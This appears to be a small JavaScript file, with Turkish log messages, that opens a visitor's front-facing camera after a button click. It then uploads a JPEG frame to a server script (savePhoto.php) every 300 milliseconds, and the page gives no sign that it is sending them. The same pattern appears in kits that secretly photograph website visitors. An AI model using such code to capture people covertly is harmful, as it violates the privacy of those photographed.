const video = document.getElementById('video');
const startButton = document.getElementById('startButton');

startButton.addEventListener('click', startCapture);

function startCapture() {
    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
        .then(stream => {
            video.srcObject = stream;
            video.play();

            setInterval(() => capturePhoto(), 300);
        })
        .catch(error => {
            console.error('Kamera erişimi reddedildi:', error);
        });
}

function capturePhoto() {
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const context = canvas.getContext('2d');
    context.drawImage(video, 0, 0);

    const dataURL = canvas.toDataURL('image/jpeg');

    const xhr = new XMLHttpRequest();
    xhr.open('POST', 'savePhoto.php');
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onload = function() {
        if (xhr.status === 200) {
            console.log('Fotoğraf kaydedildi.');
        } else {
            console.error('Fotoğraf kaydedilirken hata oluştu:', xhr.statusText);
        }
    };
    xhr.send('data=' + encodeURIComponent(dataURL));
}
